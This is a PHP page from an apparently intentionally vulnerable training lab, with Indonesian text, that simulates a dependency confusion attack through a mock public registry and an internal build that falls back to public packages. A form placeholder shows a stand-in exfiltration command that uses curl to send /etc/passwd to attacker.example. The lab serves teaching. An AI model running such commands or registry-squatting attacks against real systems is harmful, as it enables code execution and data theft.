<?php
$title = 'Lab 2: Dependency Confusion';
include 'header.php';

// Daftar dependency yang dipakai proses "Internal Build" - HARUS konsisten dengan
// internal-package-registry.json (file konfigurasi yang "bocor" ke webroot).
$build_dependencies = ['acme-internal-ui-kit', 'acme-payment-sdk', 'lodash'];

// Registry internal perusahaan - HANYA berisi 2 dari 3 paket di atas. "acme-payment-sdk"
// ternyata tidak pernah benar-benar dipublikasikan ke registry internal (mis. developer lupa,
// atau baru direncanakan tapi belum jadi).
$internal_registry = ['acme-internal-ui-kit', 'lodash'];

$publish_msg = null;
$build_log = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'publish') {
    $name = trim((string)($_POST['pkg_name'] ?? ''));
    $code = (string)($_POST['pkg_code'] ?? '');
    if ($name !== '' && $code !== '') {
        $db['public_registry'][$name] = $code;
        save_db($db);
        $publish_msg = "Paket \"$name\" berhasil dipublikasikan ke Public Registry.";
    } else {
        $publish_msg = 'Nama paket dan isi kode wajib diisi.';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'build') {
    $lines = [];
    $lines[] = 'Menjalankan Internal Build...';
    $lines[] = 'Dependency yang dibutuhkan: ' . implode(', ', $build_dependencies);
    $lines[] = '';
    foreach ($build_dependencies as $dep) {
        if (in_array($dep, $internal_registry, true)) {
            $lines[] = "[OK] $dep -> diresolve dari Internal Registry (aman).";
            continue;
        }
        $lines[] = "[!] $dep -> TIDAK ditemukan di Internal Registry.";
        if (isset($db['public_registry'][$dep])) {
            $lines[] = "    Fallback ke Public Registry... ditemukan paket publik bernama \"$dep\".";
            $lines[] = "    Menjalankan kode dari $dep: " . $db['public_registry'][$dep];
        } else {
            $lines[] = "    Tidak ditemukan di Public Registry juga - build gagal untuk dependency ini.";
        }
    }
    $build_log = implode("\n", $lines);
}
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: proses "Internal Build" di halaman ini mengambil beberapa dependency.
Sebagian nama dependency itu HANYA dipakai secara internal, tapi nama-namanya sendiri kadang
bocor lewat file konfigurasi yang tidak sengaja ikut ter-deploy ke webroot publik (manifest
build, package config, dsb). Coba jelajahi webroot aplikasi ini untuk menemukan file semacam itu
&mdash; misalnya coba akses <code>/internal-package-registry.json</code> langsung.</p>
<p class="hint">Setelah tahu nama dependency internalnya, publikasikan paket PUBLIK dengan nama
yang PERSIS SAMA lewat form "Publish ke Public Registry" di bawah (isi apa saja, mis.
<code>system('id')</code> sebagai simulasi payload). Lalu klik "Jalankan Internal Build" dan
lihat apa yang terjadi.</p>
</details>

<h3>1. Publish ke Public Registry</h3>
<p>Simulasi <code>npm publish</code> / registry paket publik mana pun &mdash; siapa saja bisa
mendaftarkan nama paket apa pun di sini, tanpa verifikasi kepemilikan namespace internal
perusahaan mana pun.</p>
<form method="post">
  <input type="hidden" name="action" value="publish">
  <label>Nama paket</label><br>
  <input type="text" name="pkg_name" placeholder="mis. acme-payment-sdk"><br>
  <label>Isi "kode" paket (bebas, simulasi payload)</label><br>
  <textarea name="pkg_code" rows="3" style="width:100%; max-width:500px;" placeholder="mis. system('curl attacker.example/steal?data=$(cat /etc/passwd|base64)');"></textarea><br>
  <button type="submit">Publish ke Public Registry</button>
</form>
<?php if ($publish_msg): ?>
<div class="ok-box"><?php echo htmlspecialchars($publish_msg); ?></div>
<?php endif; ?>

<?php if (!empty($db['public_registry'])): ?>
<h4>Paket publik yang sudah terdaftar</h4>
<table class="data-table">
<tr><th>Nama</th><th>Isi kode</th></tr>
<?php foreach ($db['public_registry'] as $n => $c): ?>
<tr><td><?php echo htmlspecialchars($n); ?></td><td><code><?php echo htmlspecialchars($c); ?></code></td></tr>
<?php endforeach; ?>
</table>
<?php endif; ?>

<h3>2. Jalankan Internal Build</h3>
<p>Simulasi pipeline CI yang menginstall semua dependency project sebelum build/deploy.</p>
<form method="post">
  <input type="hidden" name="action" value="build">
  <button type="submit">Jalankan Internal Build</button>
</form>

<?php if ($build_log !== null): ?>
<div class="result-box"><?php echo htmlspecialchars($build_log); ?></div>
<?php endif; ?>

<p class="hint">Kenapa berhasil: <code>acme-payment-sdk</code> adalah nama paket internal yang
dipakai di dependency list perusahaan, tapi tidak pernah benar-benar terdaftar di Internal
Registry mereka sendiri. Saat proses resolusi dependency tidak menemukannya secara internal, ia
diam-diam <em>fallback</em> ke registry publik &mdash; dan mengambil (lalu "menjalankan") paket
apa pun dengan nama itu yang lebih dulu didaftarkan siapa pun di sana. Ini persis pola serangan
dependency confusion nyata yang dipublikasikan Alex Birsan tahun 2021, yang berhasil mengeksekusi
kode di jaringan internal Apple, Microsoft, Tesla, PayPal, dan puluhan perusahaan besar lainnya.</p>

<?php include 'footer.php'; ?>
